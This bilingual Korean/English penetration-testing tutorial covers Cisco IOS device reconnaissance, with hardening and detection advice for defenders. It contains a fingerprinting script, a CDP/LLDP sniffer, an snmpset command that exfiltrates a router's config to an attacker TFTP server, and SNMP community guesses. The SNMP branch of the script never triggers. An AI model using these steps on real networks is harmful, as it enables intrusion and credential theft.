> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 32-01. Cisco IOS 구조 이해와 장비 정찰

## 0. 초보자를 위한 개념 이해

### Cisco IOS란?

**Cisco IOS(Internetwork Operating System)**는 Cisco 라우터와 스위치에서 실행되는 운영체제입니다.

```
일반 컴퓨터 OS:
  Windows, Linux, macOS
  → 범용 목적

네트워크 장비 OS:
  Cisco IOS, IOS XE
  → 라우팅, 스위칭, 방화벽 전용

Cisco 장비가 중요한 이유:
  - 세계 시장 점유율 1위 (대기업, ISP, 대학 등)
  - 한 대 해킹 → 그 장비를 통과하는 모든 트래픽 제어
  - 네트워크 인프라의 "뼈대"
```

### 네트워크 장비 해킹의 특수성

```
일반 서버 해킹과의 차이:
  일반 서버:
    - 파일을 탈취하거나 코드를 실행
    - OS 자체를 공격
    
  네트워크 장비 해킹:
    - 라우팅 테이블을 조작 (트래픽 방향 변경)
    - 관리자 자격증명을 탈취 (설정 파일)
    - 트래픽을 도청 (MitM)
    - 장비 설정을 변경 (보안 정책 우회)
```

**실제 사례 (2023 CVE-2023-20198):**
```
Cisco IOS XE Web UI 인증 우회 취약점
- 전 세계 수만 대 Cisco 장비 영향
- 인증 없이 새 관리자 계정 생성 가능
- 즉시 패치 없으면 전체 장비 장악 가능
→ "라우터 Web UI를 안 쓰니까 괜찮다"는 가정이 틀렸음을 증명
```

### Cisco 장비 권한 모드

```
User EXEC Mode (>):
  제한된 명령어만 사용
  "일반 사용자"

Privileged EXEC Mode (#):
  모든 show 명령어 + 설정 변경 진입
  "관리자 (enable 명령으로 진입)"

Global Configuration Mode (config)#:
  실제 설정 변경
  "관리자 + 설정 모드"

공격자 목표: Privileged EXEC Mode (#) 획득
  → "enable" 비밀번호를 알면 완전 제어
```

---

> **한 줄 요약**: 네트워크 장비 침투는 "이 장비가 뭐고, 누가 어떻게 관리하는가"를 파악하는 정찰이 전체의 70%다.
> OS 내부 구조와 관리 프로토콜 특성을 알면 어디에 공격 지점이 있는지 지도가 그려진다.

## 1. 운영체제 계보 — 무엇이 다른가

Cisco 장비를 쓴다고 해서 전부 같은 OS가 아닙니다. 보안 관점에서 중요한 차이가 있습니다.

| OS | 특징 | 대표 플랫폼 | 공격 표면의 차이점 |
|----|------|-------------|--------------------|
| **IOS (클래식)** | 단일 바이너리, 단일 메모리 공간 | Catalyst 2900/3500, ISR G1 | 한 프로세스 크래시 = 장비 재부팅 |
| **IOS XE** | Linux 커널 위에 IOSd 프로세스 | Catalyst 9000, ISR 4000, ASR 1000 | Linux 공격면(bash, 컨테이너) 추가, Web UI 존재 |
| **IOS XR** | QNX→Linux 커널, 마이크로커널 스타일 | ASR 9000, NCS | BGP 같은 개별 프로세스 크래시 가능, 복구는 빠름 |
| **NX-OS** | Linux 기반, 가상 디바이스 컨텍스트(VDC) 지원 | Nexus 시리즈 | guestshell(배시) 접근 가능, vPC·FabricPath 공격 표면 |

**실무 인식 팁**:
- `show version` 출력의 첫 번째 줄이 "IOS Software" → 클래식 IOS
- "IOS XE Software" → IOS XE (가장 흔한 현대 공격 표적)
- "NX-OS" → 데이터센터 Nexus 스위치

**왜 이게 중요한가**: IOS XE는 **Web UI (HTTP Server)** 를 내장합니다. CVE-2023-20198이 바로 이 Web UI 인증 우회로 전 세계 수만 대의 Cisco IOS XE 장비가 실제로 털렸습니다. "누가 라우터 웹 UI를 쓰겠냐"는 가정이 무너진 사건이었습니다.

## 2. 메모리·파일시스템 레이아웃 — 설정 파일은 어디 있는가

클래식 IOS에서의 저장 영역:

```
flash:                 ← OS 이미지 (c2800nm-advipservicesk9-mz.bin 등)
nvram:startup-config   ← 부팅 시 로드되는 설정
system:running-config  ← 현재 메모리에 올라간 설정 (편집 대상)
tftp://<ip>/...        ← 외부 TFTP 서버 (설정 백업·원격 로드)
```

IOS XE는 추가로 Linux 파일시스템이 있습니다:

```
bootflash:             ← 부팅 이미지
harddisk:              ← 운영체제 파일들 (IOSd 바이너리 포함)
/tmp, /var             ← Linux 루트파일시스템 일부
```

**공격자 관점**: IOS XE에서 `guestshell enable` 이 되어 있으면 **bash 쉘을 얻을 수 있습니다**. 적법한 진단 목적 기능이지만, 관리자가 설정해두고 잊으면 측면 이동의 발판이 됩니다.

## 3. 관리 평면 포트 — 무엇이 열려있는가

표준 관리 서비스와 기본 포트입니다. 정찰 단계에서 가장 먼저 스캔합니다.

| 서비스 | 포트 | 보안 관점 |
|--------|------|-----------|
| Telnet | 23/tcp | **평문**. 여전히 많이 쓰임, 스니핑 시 credential 그대로 |
| SSH | 22/tcp | 프로토콜 v2만 허용하는지, 공개키 인증 강제 여부 |
| HTTP | 80/tcp | Web UI. IOS XE에서 기본 켜짐 가능 (CVE-2023-20198 표적) |
| HTTPS | 443/tcp | 같음, TLS 1.0 쓰는지 주의 |
| SNMP | 161/udp | v1/v2c는 커뮤니티 스트링 평문 |
| NETCONF | 830/tcp | SSH 위의 XML RPC, 인증 우회 취약점 이력 |
| RESTCONF | 443/tcp | HTTPS 위의 REST |
| TACACS+ | 49/tcp | 인증 서버와의 통신. 키 약하면 스니핑 가능 |
| Syslog | 514/udp | 로그 유출 경로 (UDP 스푸핑으로 가짜 로그 주입 가능) |

## 4. 장비 핑거프린팅 스크립트 (Python + nmap)

직접 만들어둔 정찰 스크립트입니다. `show banner`를 받거나, SNMP sysDescr을 얻거나, SSH 배너를 파싱해 **장비 종류/버전**을 최대한 좁힙니다.

```python
#!/usr/bin/env python3
"""device_fingerprint.py — 네트워크 장비의 OS·버전을 원격에서 추정한다.

사용 예:
    python3 device_fingerprint.py 10.0.0.1
    python3 device_fingerprint.py --subnet 10.0.0.0/24 --workers 32

전제:
    - nmap이 설치되어 있어야 한다 (apt install nmap)
    - SNMP v1/v2c 커뮤니티 'public'을 먼저 시도한다
"""
from __future__ import annotations

import argparse                          # 커맨드라인 인자 파싱
import concurrent.futures                # 병렬 스캔을 위한 스레드 풀
import ipaddress                         # CIDR → 개별 IP 변환
import json                              # 결과 직렬화
import re                                # 버전 문자열 추출용 정규식
import socket                            # TCP 배너 그래빙
import subprocess                        # nmap 호출
from dataclasses import asdict, dataclass, field
from typing import Literal

# 장비를 탐지할 때 열려 있기를 기대하는 포트 목록.
# 빠른 스캔을 위해 관리 포트만 선별했다. 프로덕션 스캔에선 더 넓힐 수 있다.
MGMT_PORTS = [22, 23, 80, 443, 161, 830]


@dataclass
class DeviceProfile:
    """한 대의 장비에서 얻은 정보를 모아두는 컨테이너.
    후속 분석(JSON 리포트, DB 적재)을 위해 dataclass로 둔다."""
    ip: str
    open_ports: list[int] = field(default_factory=list)        # TCP 스캔 결과
    ssh_banner: str | None = None                              # "SSH-2.0-Cisco-1.25" 같은 라인
    snmp_sysdescr: str | None = None                           # SNMP OID 1.3.6.1.2.1.1.1.0
    telnet_banner: str | None = None                           # 최초 300 바이트
    os_guess: Literal["IOS", "IOS XE", "IOS XR", "NX-OS", "Junos", "unknown"] = "unknown"
    version_guess: str | None = None                           # "15.2(4)M5" 같은 문자열


def tcp_banner(ip: str, port: int, timeout: float = 2.0) -> str | None:
    """단일 TCP 포트에 연결해 첫 수신 바이트를 읽는다.
    SSH·Telnet이 접속 직후 배너를 보내므로 이것만으로도 많은 정보가 들어온다."""
    try:
        # 지정 시간 내 connect+recv가 실패하면 None 반환 — 절대 예외 안 던지게 한다
        with socket.create_connection((ip, port), timeout=timeout) as s:
            s.settimeout(timeout)
            return s.recv(300).decode(errors="ignore")
    except OSError:
        return None


def snmp_sysdescr(ip: str, community: str = "public", timeout: float = 2.0) -> str | None:
    """SNMPv1/v2c로 sysDescr(OID .1.3.6.1.2.1.1.1.0)을 조회한다.
    이 문자열에는 보통 벤더·모델·OS 이름이 평문으로 들어있어 지문 감식 일등공신이다."""
    try:
        # snmpwalk 대신 snmpget을 쓴다 — 단일 OID이므로 가볍다
        result = subprocess.run(
            ["snmpget", "-v", "2c", "-c", community, "-t", str(timeout),
             "-Ovq", ip, "1.3.6.1.2.1.1.1.0"],
            capture_output=True, text=True, timeout=timeout + 2,
        )
        # 정상 응답이면 stdout 첫 줄이 sysDescr 값이다. 따옴표 제거.
        line = result.stdout.strip().strip('"')
        return line or None
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return None


def nmap_open_ports(ip: str) -> list[int]:
    """nmap -sS (SYN 스캔)으로 관리 포트만 빠르게 확인.
    -Pn 은 ping 생략 (ICMP 차단 환경에서도 동작), --max-retries 1 로 속도 향상."""
    try:
        result = subprocess.run(
            ["nmap", "-sS", "-Pn", "-n", "--max-retries", "1", "-p",
             ",".join(map(str, MGMT_PORTS)), "--open", "-oG", "-", ip],
            capture_output=True, text=True, timeout=30,
        )
        # nmap -oG 출력에서 "Ports: 22/open/..." 형태의 라인을 파싱한다.
        open_ports: list[int] = []
        for tok in re.findall(r"(\d+)/open/", result.stdout):
            open_ports.append(int(tok))
        return sorted(open_ports)
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return []


def classify(profile: DeviceProfile) -> None:
    """수집한 배너·sysDescr 문자열로 OS와 버전을 추정한다.
    여러 소스의 정보가 일치할 때 신뢰도가 높으므로 우선순위는 SNMP > SSH > Telnet 순."""
    haystacks = " | ".join(filter(None, [profile.snmp_sysdescr, profile.ssh_banner, profile.telnet_banner]))

    # 각 OS의 특징 키워드를 순서대로 시도. 먼저 매치되는 쪽을 채택한다.
    patterns: list[tuple[str, Literal["IOS XE", "IOS XR", "NX-OS", "IOS", "Junos"]]] = [
        (r"IOS[- ]?XE", "IOS XE"),      # "IOS-XE" 또는 "IOS XE"
        (r"IOS[- ]?XR", "IOS XR"),
        (r"NX-?OS",     "NX-OS"),
        (r"Cisco IOS",  "IOS"),          # 위에서 XE/XR이 안 잡혔을 때만 클래식 IOS로 분류
        (r"JUNOS",      "Junos"),
    ]
    for pat, label in patterns:
        if re.search(pat, haystacks, re.IGNORECASE):
            profile.os_guess = label
            break

    # 버전 문자열 추출: "Version 15.2(4)M5" 또는 "16.12.04" 같은 포맷을 잡는다
    version = re.search(r"Version\s+([\w.\(\)]+)", haystacks, re.IGNORECASE)
    if version:
        profile.version_guess = version.group(1)


def scan_one(ip: str) -> DeviceProfile:
    """한 대의 IP에 대해 전체 파이프라인을 돌린다.
    실패한 프로브는 침묵하고 넘어간다 — 대규모 스캔에서 로그가 넘치지 않도록."""
    profile = DeviceProfile(ip=ip)

    profile.open_ports = nmap_open_ports(ip)

    # 열린 포트가 있는 경우에만 후속 프로브를 시도. 닫힌 포트에 찔러봐야 무의미하다.
    if 22 in profile.open_ports:
        profile.ssh_banner = tcp_banner(ip, 22)
    if 23 in profile.open_ports:
        profile.telnet_banner = tcp_banner(ip, 23)
    if 161 in profile.open_ports:
        # UDP라 nmap -sS로는 안 잡히지만, 운영망에서 자주 열려있어 별도 시도한다
        profile.snmp_sysdescr = snmp_sysdescr(ip)

    classify(profile)
    return profile


def main() -> None:
    ap = argparse.ArgumentParser(description="Network device OS/version fingerprinting")
    # 단일 IP 또는 서브넷 중 택일
    group = ap.add_mutually_exclusive_group(required=True)
    group.add_argument("ip", nargs="?", help="단일 대상 IP")
    group.add_argument("--subnet", help="CIDR 표기의 서브넷 (예: 10.0.0.0/24)")
    ap.add_argument("--workers", type=int, default=16, help="동시 스캔 수")
    ap.add_argument("--out", help="결과를 저장할 JSON 경로")
    args = ap.parse_args()

    # 스캔 대상 목록 생성
    if args.subnet:
        targets = [str(ip) for ip in ipaddress.ip_network(args.subnet, strict=False).hosts()]
    else:
        targets = [args.ip]

    results: list[DeviceProfile] = []
    # ThreadPoolExecutor가 소켓 블로킹 I/O에는 GIL 영향을 덜 받아 적합하다
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as ex:
        for profile in ex.map(scan_one, targets):
            # 열린 포트가 하나도 없으면 리포트에서 생략 — 노이즈 방지
            if profile.open_ports:
                results.append(profile)
                print(f"[{profile.ip:15}] {profile.os_guess:8} "
                      f"ver={profile.version_guess or '?':12} "
                      f"ports={profile.open_ports}")

    # JSON 출력은 선택적. CI·리포트 자동화에 쓸 때만 켠다.
    if args.out:
        with open(args.out, "w") as f:
            json.dump([asdict(p) for p in results], f, indent=2, ensure_ascii=False)


if __name__ == "__main__":
    main()
```

**현장 팁**:
- SSH 배너 `SSH-2.0-Cisco-1.25` 에서 `Cisco-1.25` 는 IOS SSH 구현의 내부 버전입니다. 이 값으로 IOS 메이저 버전을 좁힐 수 있습니다.
- SNMP `sysDescr` 는 보통 `"Cisco IOS Software, C2800 Software (C2800NM-ADVIPSERVICESK9-M), Version 12.4(24)T1, RELEASE SOFTWARE"` 같은 형태로, **이 한 줄만 얻으면 공격 가능 CVE 목록을 거의 바로 좁힐 수 있습니다**.

## 5. CDP/LLDP — 내부자에게만 보이는 금광

스위치 포트에 붙은 노드라면 **CDP**(Cisco Discovery Protocol) 또는 **LLDP** 프레임을 가만히 기다리기만 해도 굉장히 많은 정보가 들어옵니다.

- 장비 모델·IOS 버전·IP·기본 VLAN
- 네이티브 VLAN ID → VLAN hopping 재료
- 관리자가 달아둔 인터페이스 설명 → 네트워크 구조 추측

```python
#!/usr/bin/env python3
"""cdp_lldp_sniffer.py — 스위치 포트에 붙어 CDP/LLDP 프레임에서 정보를 추출한다."""
from __future__ import annotations

import argparse                                           # CLI 인자
from scapy.all import sniff, Ether                        # 기본 패킷 캡처
from scapy.contrib.cdp import CDPv2_HDR, CDPMsgDeviceID, \
    CDPMsgSoftwareVersion, CDPMsgPlatform, CDPMsgPortID, \
    CDPMsgNativeVLAN                                      # CDP TLV 파싱
from scapy.contrib.lldp import LLDPDUSystemName, \
    LLDPDUSystemDescription, LLDPDUChassisID              # LLDP TLV 파싱


def handle_cdp(pkt) -> None:
    """CDP 프레임에서 관심 있는 TLV만 골라 출력한다.
    CDP는 멀티캐스트 01:00:0c:cc:cc:cc 로 송신되며 기본 60초 주기다."""
    if not pkt.haslayer(CDPv2_HDR):
        return
    # 각 TLV 존재 여부를 확인하며 꺼낸다. 없을 수도 있으므로 getlayer 사용.
    device = pkt[CDPMsgDeviceID].val.decode(errors="ignore") if pkt.haslayer(CDPMsgDeviceID) else "?"
    version = pkt[CDPMsgSoftwareVersion].val.decode(errors="ignore") if pkt.haslayer(CDPMsgSoftwareVersion) else "?"
    platform = pkt[CDPMsgPlatform].val.decode(errors="ignore") if pkt.haslayer(CDPMsgPlatform) else "?"
    port = pkt[CDPMsgPortID].iface.decode(errors="ignore") if pkt.haslayer(CDPMsgPortID) else "?"
    # 네이티브 VLAN ID — VLAN hopping 에서 사용할 중요한 값
    nvlan = pkt[CDPMsgNativeVLAN].vlan if pkt.haslayer(CDPMsgNativeVLAN) else "?"

    print(f"[CDP]  {device}  port={port}  platform={platform}  native_vlan={nvlan}")
    # 소프트웨어 버전은 길어서 별도 라인으로
    print(f"       {version.splitlines()[0] if version else '?'}")


def handle_lldp(pkt) -> None:
    """LLDP는 표준 프로토콜이라 이기종 환경에서도 잡힌다.
    멀티캐스트 01:80:c2:00:00:0e 에서 송신."""
    if not pkt.haslayer(LLDPDUChassisID):
        return
    sysname = pkt[LLDPDUSystemName].system_name.decode(errors="ignore") if pkt.haslayer(LLDPDUSystemName) else "?"
    sysdesc = pkt[LLDPDUSystemDescription].description.decode(errors="ignore") if pkt.haslayer(LLDPDUSystemDescription) else "?"
    print(f"[LLDP] {sysname}")
    print(f"       {sysdesc[:120]}")


def dispatcher(pkt) -> None:
    """CDP/LLDP 둘 다 관심 대상이므로 하나의 콜백으로 라우팅."""
    if pkt.haslayer(CDPv2_HDR):
        handle_cdp(pkt)
    elif pkt.haslayer(LLDPDUChassisID):
        handle_lldp(pkt)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("-i", "--iface", required=True, help="캡처할 네트워크 인터페이스 (예: eth0)")
    ap.add_argument("-c", "--count", type=int, default=0, help="0=무제한, N=N개 받으면 종료")
    args = ap.parse_args()

    # Ethernet dst 멀티캐스트 주소로 BPF 필터를 둬서 CPU 부하를 줄인다
    bpf = "(ether dst 01:00:0c:cc:cc:cc) or (ether dst 01:80:c2:00:00:0e)"
    print(f"[*] Sniffing {args.iface} for CDP/LLDP (filter: {bpf})")
    sniff(iface=args.iface, prn=dispatcher, filter=bpf, count=args.count, store=False)


if __name__ == "__main__":
    main()
```

CDP 프레임은 기본 60초 간격이므로 1-2분만 앉아있으면 주변 스위치 구조가 한눈에 들어옵니다.

**방어자 조언**: 불필요한 포트에서 CDP/LLDP를 끕니다.
```
! 외부로 향하는 인터페이스에서만 꺼도 큰 효과
interface GigabitEthernet0/1
 no cdp enable
 no lldp transmit
 no lldp receive
```

## 6. 원격 설정 파일 획득 경로

### 6.1 SNMP write community로 `config`을 TFTP로 뽑기

SNMPv1/v2c에 **write** 권한 커뮤니티 스트링이 있으면 장비 설정을 통째로 외부 TFTP 서버에 뽑을 수 있습니다. 10년 넘은 고전 기법이지만 지금도 자주 성공합니다.

```bash
# 1) 공격자 TFTP 서버 기동 (Kali 예시)
sudo apt install tftpd-hpa
sudo systemctl start tftpd-hpa
# 기본 디렉토리 /srv/tftp, 쓰기 가능하게 chmod 777 /srv/tftp

# 2) SNMP SET으로 running-config을 TFTP로 푸시하도록 지시 (write community 필요)
#    OID .1.3.6.1.4.1.9.9.96 은 CISCO-CONFIG-COPY-MIB
TARGET=10.0.0.1
TFTP_SRV=10.0.99.99
COMMUNITY=private                 # 실제 환경에선 브루트포스로 탐색한다

# 각 OID의 의미를 하나씩 주석으로 적어두었다
snmpset -v 2c -c $COMMUNITY $TARGET \
  .1.3.6.1.4.1.9.9.96.1.1.1.1.2.101 i 1  `# ProtocolType = TFTP` \
  .1.3.6.1.4.1.9.9.96.1.1.1.1.3.101 i 4  `# SourceType    = running-config` \
  .1.3.6.1.4.1.9.9.96.1.1.1.1.4.101 i 1  `# DestType      = networkFile` \
  .1.3.6.1.4.1.9.9.96.1.1.1.1.5.101 a $TFTP_SRV  `# TFTP 서버 IP` \
  .1.3.6.1.4.1.9.9.96.1.1.1.1.6.101 s cfg.txt    `# 저장 파일명` \
  .1.3.6.1.4.1.9.9.96.1.1.1.1.14.101 i 1 `# Action = active (작업 시작)`

# 3) /srv/tftp/cfg.txt 에 running-config이 떨어져 있다
```

### 6.2 HTTP/HTTPS Web UI 취약점 (IOS XE 전용)

CVE-2023-20198 계열처럼 Web UI 인증 우회가 되면 `/webui/logoutconfirm.html?logon_hash=1` 같은 엔드포인트에 POST 한 번으로 **레벨 15 계정을 만들 수 있습니다**. 실제로 2023년 말 수만 대의 공개 라우터에 공격자가 백도어 계정을 심었던 사건이 있었고, 지금도 패치되지 않은 장비가 Shodan에 검색됩니다.

방어는 단순합니다 — **외부 인터페이스에서 HTTP/HTTPS 서버를 끕니다**.

```
no ip http server
no ip http secure-server
```

## 7. 정찰 단계 체크리스트

공격자·방어자 양쪽 모두 다음을 먼저 확인합니다.

**공격자**:
- [ ] TCP 22/23/80/443/830, UDP 161 스캔
- [ ] SNMP 커뮤니티 `public/private/cisco/manager/secret` 사전 시도
- [ ] SSH 배너·sysDescr 로 OS 버전 확보
- [ ] CDP/LLDP 스니핑으로 관리 VLAN·이웃 장비 파악
- [ ] Web UI 존재 확인 → 최신 CVE 검색
- [ ] TFTP 서버 방향 아웃바운드 가능 여부 (설정 exfil 경로)

**방어자**:
- [ ] 관리 평면을 **별도 VRF** 또는 관리 전용 VLAN으로 분리
- [ ] SNMP는 v3만 허용, 읽기 커뮤니티조차 ACL 적용
- [ ] Web UI 끄기. 꼭 써야 하면 관리망에서만 접근
- [ ] SSH 프로토콜 v2 강제, 비밀번호 인증 대신 공개키
- [ ] CDP/LLDP는 트렁크·내부 링크에서만 활성화
- [ ] 로그인 배너에 법적 경고문 명시 (기술적 효과는 없지만 법적 사후 대응용)

## 8. 마무리

OS 계보·파일시스템·관리 포트·지문 감식까지 한 번 정리해 두면, 이후 섹션(02–04)에서 **"어떤 시나리오가 어느 장비·어느 관리 평면 위에서 돌아가는지"** 가 훨씬 명확히 읽힙니다. 네트워크 장비 공격은 고전이지만, 2025년 CVE 목록이 말해주듯 여전히 가장 빠르게 돈이 되는 표적 중 하나입니다.

다음 문서(02)에서는 이 정보를 바탕으로 **Layer 2 공격**, 즉 같은 브로드캐스트 도메인 안에서 어떻게 VLAN 경계를 넘고 스위치를 속이는지를 다룹니다.

---

<!-- detect-validate-32 -->
## 네트워크 장비 정찰 탐지와 방어 검증

장비 정찰은 *기본 SNMP community·노출 관리 서비스·배너 누출·구 IOS CVE*를 노린다. 방어자는 **자체 장비의 노출 표면과 관리 접근이 통제되는가**를 검증해야 한다. 검증은 **소유 장비/망**에서만.

### 공격 → 노리는 약점 → 1차 통제(방어자) → 탐지 신호

| 기법 | 노리는 약점 | 1차 통제(방어자) | 탐지 신호 |
|---|---|---|---|
| SNMP 정찰(public/private) | 기본 community | community 변경·SNMPv3 | public/private 응답 |
| 노출 관리 서비스(telnet/http) | 평문 관리 | SSH/HTTPS·ACL | 23/80 외부 응답 |
| 배너/버전 누출 | 정보 노출 | 배너 제거 | 버전 배너 노출 |
| 구 IOS 알려진 CVE | 미패치 | 펌웨어 갱신 | 취약 버전 |

### 방어 검증 (직접 확인)

```bash
# 1) 자체 장비 노출 관리 서비스 점검(소유 망) — telnet/http/SNMP
nmap -sU -sT -p T:23,80,443,22,U:161 192.168.1.1 2>/dev/null | grep -iE "open|snmp|telnet"
# 2) SNMP 기본 community 응답 점검 — public/private면 정찰 노출
snmpwalk -v2c -c public 192.168.1.1 system 2>/dev/null | head
```

> 장비 정찰 방어는 *노출 표면이 좁고 관리가 통제되는가*다 — "장비 동작한다"와 "telnet이 닫혀 있고 SNMP가 기본 community로 안 응답한다"는 다르다. 소유 망에서 노출 서비스·SNMP 응답을 직접 확인한다([[02_Network_Hacking]], [[24_Network_Infrastructure_Security]], [[13_SOC_Blue_Team]]).

---

<a name="english"></a>

# 32-01. Understanding Cisco IOS Architecture and Device Reconnaissance

> **One-line summary**: In network device penetration, reconnaissance — understanding "what this device is and how it's managed" — accounts for 70% of the work.
> Once you understand the internal OS structure and management protocol characteristics, you can map where the attack surfaces lie.

## 1. OS Lineage — What Makes Them Different

Not all Cisco devices run the same OS. There are important differences from a security perspective.

| OS | Characteristics | Representative Platforms | Attack Surface Differences |
|----|-----------------|--------------------------|---------------------------|
| **IOS (Classic)** | Single binary, single memory space | Catalyst 2900/3500, ISR G1 | One process crash = device reboot |
| **IOS XE** | IOSd process on Linux kernel | Catalyst 9000, ISR 4000, ASR 1000 | Additional Linux attack surface (bash, containers), Web UI present |
| **IOS XR** | QNX→Linux kernel, microkernel style | ASR 9000, NCS | Individual processes (e.g., BGP) can crash independently; recovery is faster |
| **NX-OS** | Linux-based, supports Virtual Device Context (VDC) | Nexus series | guestshell (bash) access possible, vPC/FabricPath attack surface |

**Practical identification tips**:
- If the first line of `show version` says "IOS Software" → Classic IOS
- "IOS XE Software" → IOS XE (the most common modern attack target)
- "NX-OS" → Datacenter Nexus switch

**Why this matters**: IOS XE has a built-in **Web UI (HTTP Server)**. CVE-2023-20198 exploited an authentication bypass in this Web UI, compromising tens of thousands of Cisco IOS XE devices worldwide. It shattered the assumption that "nobody uses the router web UI."

## 2. Memory and Filesystem Layout — Where Are the Config Files?

Storage areas in classic IOS:

```
flash:                 ← OS image (c2800nm-advipservicesk9-mz.bin, etc.)
nvram:startup-config   ← Configuration loaded at boot
system:running-config  ← Currently active configuration in memory (editable)
tftp://<ip>/...        ← External TFTP server (config backup/remote load)
```

IOS XE additionally has a Linux filesystem:

```
bootflash:             ← Boot image
harddisk:              ← OS files (including IOSd binary)
/tmp, /var             ← Parts of the Linux root filesystem
```

**Attacker perspective**: If `guestshell enable` is configured on IOS XE, **a bash shell can be obtained**. This is a legitimate diagnostic feature, but if an administrator enables it and forgets, it becomes a foothold for lateral movement.

## 3. Management Plane Ports — What's Open?

Standard management services and their default ports. These are the first things to scan during reconnaissance.

| Service | Port | Security Perspective |
|---------|------|---------------------|
| Telnet | 23/tcp | **Plaintext**. Still widely used; credentials are fully exposed to sniffing |
| SSH | 22/tcp | Check whether only protocol v2 is allowed and public-key authentication is enforced |
| HTTP | 80/tcp | Web UI. May be on by default in IOS XE (CVE-2023-20198 target) |
| HTTPS | 443/tcp | Same; watch for TLS 1.0 usage |
| SNMP | 161/udp | v1/v2c community strings are plaintext |
| NETCONF | 830/tcp | XML RPC over SSH; history of authentication bypass vulnerabilities |
| RESTCONF | 443/tcp | REST over HTTPS |
| TACACS+ | 49/tcp | Communication with authentication server; sniffable if key is weak |
| Syslog | 514/udp | Log exfiltration path (fake logs can be injected via UDP spoofing) |

## 4. Device Fingerprinting Script (Python + nmap)

A custom reconnaissance script. It grabs `show banner`, retrieves SNMP sysDescr, or parses SSH banners to narrow down the **device type and version** as much as possible.

```python
#!/usr/bin/env python3
"""device_fingerprint.py — Remotely estimates the OS and version of network devices.

Usage:
    python3 device_fingerprint.py 10.0.0.1
    python3 device_fingerprint.py --subnet 10.0.0.0/24 --workers 32

Prerequisites:
    - nmap must be installed (apt install nmap)
    - Tries SNMP v1/v2c community 'public' first
"""
from __future__ import annotations

import argparse                          # Command-line argument parsing
import concurrent.futures                # Thread pool for parallel scanning
import ipaddress                         # CIDR to individual IP conversion
import json                              # Result serialization
import re                                # Regex for version string extraction
import socket                            # TCP banner grabbing
import subprocess                        # nmap invocation
from dataclasses import asdict, dataclass, field
from typing import Literal

# List of ports expected to be open when probing devices.
# Only management ports are selected for fast scanning.
# Can be broadened for production scans.
MGMT_PORTS = [22, 23, 80, 443, 161, 830]


@dataclass
class DeviceProfile:
    """Container for information gathered from a single device.
    Stored as a dataclass for subsequent analysis (JSON reports, DB ingestion)."""
    ip: str
    open_ports: list[int] = field(default_factory=list)        # TCP scan results
    ssh_banner: str | None = None                              # e.g., "SSH-2.0-Cisco-1.25"
    snmp_sysdescr: str | None = None                           # SNMP OID 1.3.6.1.2.1.1.1.0
    telnet_banner: str | None = None                           # First 300 bytes
    os_guess: Literal["IOS", "IOS XE", "IOS XR", "NX-OS", "Junos", "unknown"] = "unknown"
    version_guess: str | None = None                           # e.g., "15.2(4)M5"


def tcp_banner(ip: str, port: int, timeout: float = 2.0) -> str | None:
    """Connects to a single TCP port and reads the first bytes received.
    SSH and Telnet send banners immediately upon connection, providing rich information."""
    try:
        # Returns None if connect+recv fails within the timeout — never raises exceptions
        with socket.create_connection((ip, port), timeout=timeout) as s:
            s.settimeout(timeout)
            return s.recv(300).decode(errors="ignore")
    except OSError:
        return None


def snmp_sysdescr(ip: str, community: str = "public", timeout: float = 2.0) -> str | None:
    """Queries sysDescr (OID .1.3.6.1.2.1.1.1.0) via SNMPv1/v2c.
    This string typically contains vendor, model, and OS name in plaintext — ideal for fingerprinting."""
    try:
        # Use snmpget instead of snmpwalk — it's lighter for a single OID
        result = subprocess.run(
            ["snmpget", "-v", "2c", "-c", community, "-t", str(timeout),
             "-Ovq", ip, "1.3.6.1.2.1.1.1.0"],
            capture_output=True, text=True, timeout=timeout + 2,
        )
        # On success, stdout's first line is the sysDescr value. Strip quotes.
        line = result.stdout.strip().strip('"')
        return line or None
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return None


def nmap_open_ports(ip: str) -> list[int]:
    """Quickly checks only management ports using nmap -sS (SYN scan).
    -Pn skips ping (works in ICMP-blocked environments), --max-retries 1 improves speed."""
    try:
        result = subprocess.run(
            ["nmap", "-sS", "-Pn", "-n", "--max-retries", "1", "-p",
             ",".join(map(str, MGMT_PORTS)), "--open", "-oG", "-", ip],
            capture_output=True, text=True, timeout=30,
        )
        # Parse lines in the form "Ports: 22/open/..." from nmap -oG output
        open_ports: list[int] = []
        for tok in re.findall(r"(\d+)/open/", result.stdout):
            open_ports.append(int(tok))
        return sorted(open_ports)
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return []


def classify(profile: DeviceProfile) -> None:
    """Estimates OS and version from collected banner and sysDescr strings.
    Priority is SNMP > SSH > Telnet when multiple sources agree."""
    haystacks = " | ".join(filter(None, [profile.snmp_sysdescr, profile.ssh_banner, profile.telnet_banner]))

    # Try OS characteristic keywords in order. First match wins.
    patterns: list[tuple[str, Literal["IOS XE", "IOS XR", "NX-OS", "IOS", "Junos"]]] = [
        (r"IOS[- ]?XE", "IOS XE"),      # "IOS-XE" or "IOS XE"
        (r"IOS[- ]?XR", "IOS XR"),
        (r"NX-?OS",     "NX-OS"),
        (r"Cisco IOS",  "IOS"),          # Classic IOS only if XE/XR didn't match
        (r"JUNOS",      "Junos"),
    ]
    for pat, label in patterns:
        if re.search(pat, haystacks, re.IGNORECASE):
            profile.os_guess = label
            break

    # Extract version string: matches "Version 15.2(4)M5" or "16.12.04" formats
    version = re.search(r"Version\s+([\w.\(\)]+)", haystacks, re.IGNORECASE)
    if version:
        profile.version_guess = version.group(1)


def scan_one(ip: str) -> DeviceProfile:
    """Runs the full pipeline against a single IP.
    Failed probes are silently skipped — prevents log flooding during large-scale scans."""
    profile = DeviceProfile(ip=ip)

    profile.open_ports = nmap_open_ports(ip)

    # Only attempt follow-up probes if ports are open — no point probing closed ports
    if 22 in profile.open_ports:
        profile.ssh_banner = tcp_banner(ip, 22)
    if 23 in profile.open_ports:
        profile.telnet_banner = tcp_banner(ip, 23)
    if 161 in profile.open_ports:
        # UDP is not caught by nmap -sS, but often open in production networks
        profile.snmp_sysdescr = snmp_sysdescr(ip)

    classify(profile)
    return profile


def main() -> None:
    ap = argparse.ArgumentParser(description="Network device OS/version fingerprinting")
    # Choose between single IP or subnet
    group = ap.add_mutually_exclusive_group(required=True)
    group.add_argument("ip", nargs="?", help="Single target IP")
